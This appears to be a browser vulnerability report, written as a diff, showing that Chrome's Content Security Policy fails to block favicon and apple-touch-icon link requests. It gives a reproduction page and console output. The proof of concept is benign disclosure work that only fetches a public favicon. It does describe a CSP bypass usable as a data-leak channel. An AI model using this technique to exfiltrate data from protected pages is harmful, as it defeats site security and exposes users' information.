@@ -1,0 +1,15 @@
+VULNERABILITY DETAILS
+Chrome's CSP does not block favicon request properly.
+Due to this, attacker can bypass CSP partially and get sensitive information via favicon request.
+FYI, Spartan has same bug. Firefox is OK. But Firefox Mobile has same bug. I will report to both vendor later.
+VERSION
+42.0.2311.135 m
+windows 8.1
+REPRODUCTION CASE
+Go to http://vulnerabledoma.in/csp_favicon . This page has CSP header and only following contents:
+<link rel=icon href=http://www.google.com/favicon.ico?0123456789>
+See console. You can see the following message:
+Refused to load the image 'http://www.google.com/favicon.ico?9.17194871771247' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.
+But in fact, Chrome sends favicon request. See the request using network tool.
+FYI, Chrome Mobile(Android) has same issue. Also, the following request does not block by CSP:
+<link rel=apple-touch-icon href=http://www.google.com/favicon.ico> <link rel=apple-touch-icon-precomposed href=http://www.google.com/favicon.ico>
